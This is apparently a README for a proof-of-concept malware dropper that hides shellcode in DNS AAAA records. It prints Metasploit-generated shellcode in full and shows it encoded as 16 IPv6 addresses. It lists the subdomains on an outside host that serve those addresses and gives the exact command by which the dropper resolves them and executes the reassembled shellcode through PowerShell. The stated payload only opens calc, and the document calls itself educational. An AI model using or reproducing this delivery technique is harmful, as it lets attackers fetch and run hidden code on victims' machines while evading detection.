# IPv6Malware
Malware Powered By IPv6 - PoC

This program shows only Proof of Concept for new way that malware can communicate and work with help of IPv6 addresses. 

The idea implemented in this program presents "Exploiting DNS AAAA resource records as payload". 

Working Example:

1. Previously we generated with Metasploit one simple shell code that executes calc.exe.

\xdb\xc3\xd9\x74\x24\xf4\xbe\xe8\x5a\x27\x13\x5f\x31\xc9\xb1\x33\x31\x77\x17\x83\xc7\x04\x03\x9f\x49\xc5\xe6\xa3\x86\x80\x09\x5b\x57\xf3\x80\xbe\x66\x21\xf6\xcb\xdb\xf5\x7c\x99\xd7\x7e\xd0\x09\x63\xf2\xfd\x3e\xc4\xb9\xdb\x71\xd5\x0f\xe4\xdd\x15\x11\x98\x1f\x4a\xf1\xa1\xd0\x9f\xf0\xe6\x0c\x6f\xa0\xbf\x5b\xc2\x55\xcb\x19\xdf\x54\x1b\x16\x5f\x2f\x1e\xe8\x14\x85\x21\x38\x84\x92\x6a\xa0\xae\xfd\x4a\xd1\x63\x1e\xb6\x98\x08\xd5\x4c\x1b\xd9\x27\xac\x2a\x25\xeb\x93\x83\xa8\xf5\xd4\x23\x53\x80\x2e\x50\xee\x93\xf4\x2b\x34\x11\xe9\x8b\xbf\x81\xc9\x2a\x13\x57\x99\x20\xd8\x13\xc5\x24\xdf\xf0\x7d\x50\x54\xf7\x51\xd1\x2e\xdc\x75\xba\xf5\x7d\x2f\x66\x5b\x81\x2f\xce\x04\x27\x3b\xfc\x51\x51\x66\x6a\xa7\xd3\x1c\xd3\xa7\xeb\x1e\x73\xc0\xda\x95\x1c\x97\xe2\x7f\x59\x67\xa9\x22\xcb\xe0\x74\xb7\x4e\x6d\x87\x6d\x8c\x88\x04\x84\x6c\x6f\x14\xed\x69\x2b\x92\x1d\x03\x24\x77\x22\xb0\x45\x52\x41\x57\xd6\x3e\xa8\xf2\x5e\xa4\xb4

2. The above shellcode is transformed into 16 IPv6 addresses

dbc3:d974:24f4:bee8:5a27:135f:31c9:b133
3177:17:83c:7040:39f:49c5:e6a3:86
8009:5b57:f3:80be:6621:f6cb:dbf5:7c99
d77e:d009:63f2:fd3e:c4b9:db71:d50f:e4dd
1511:981f:4af1:a1:d09:ff0e:60c:6f:
a0bf:5bc2:55cb:19df:54:1b16:5f2f:1ee8
1485:2138:8492:6a:a0a:efd:4ad1:631e:
b6:9808:d5:4c1b:d927:ac2a:25eb:9383
a8f5:d423:53:802e:50ee:93:f42b:3411
e98b:bf81:c92a:1357:99:20d8:13:c524
df:f07d:505:4f7:51d1:2edc:75ba:f57d
2f66:5b81:2f:ce04:27:3bfc:5151:666a
a7d3:1cd3:a7eb:1e73:c0da:951c:97e2:7f59
67a9:22c:be07:4:b74e:6d87:6d8c:8804
846c:6f14:ed69:2b92:1d03:2477:22:b045
52:4157:d63e:a8f2:5ea4:b4

3. This IPv6 addresses are set as values to 16 AAAA DNS Records hosted on piperevski.com

av1.piperevski.com 
av2.piperevski.com 
av3.piperevski.com 
av4.piperevski.com 
av5.piperevski.com 
av6.piperevski.com 
av7.piperevski.com 
av8.piperevski.com 
av9.piperevski.com 
av10.piperevski.com 
av11.piperevski.com 
av12.piperevski.com 
av13.piperevski.com 
av14.piperevski.com 
av15.piperevski.com 
av16.piperevski.com

4. This program presents malware dropper  that has no malicious code inside, only functions to retrieve AAAA DNS Records, convert IPv6 addresses into shellcode and execute it on target system via PowerShell command. This is done by executing following command:
---------------------------
mymalware.exe 16 1 8.8.8.8 av1.piperevski.com av2.piperevski.com av3.piperevski.com av4.piperevski.com av5.piperevski.com av6.piperevski.com av7.piperevski.com av8.piperevski.com av9.piperevski.com av10.piperevski.com av11.piperevski.com av12.piperevski.com av13.piperevski.com av14.piperevski.com av15.piperevski.com av16.piperevski.com 
---------------------------
Above command syntax is
mymalware.exe 
[number of FQDN to resolve in IPv6 addr] 
[1- use external DNS ip address to resolve AAAA queries, 0- use system DNS set server IP] 
[xx.xx.xx.xx- external DNS ip address if 1 is set on previous option, 0- if 1 is set on previous option] 
[FQDN 1]
...
[FQDN N]

Note: THIS PROGRAM IS DESIGNED TO BE USED IN EDUCATIONAL PURPOSE AND USING IT IN ANY OTHER FORM IS STRICTLYU FORBIDEN.


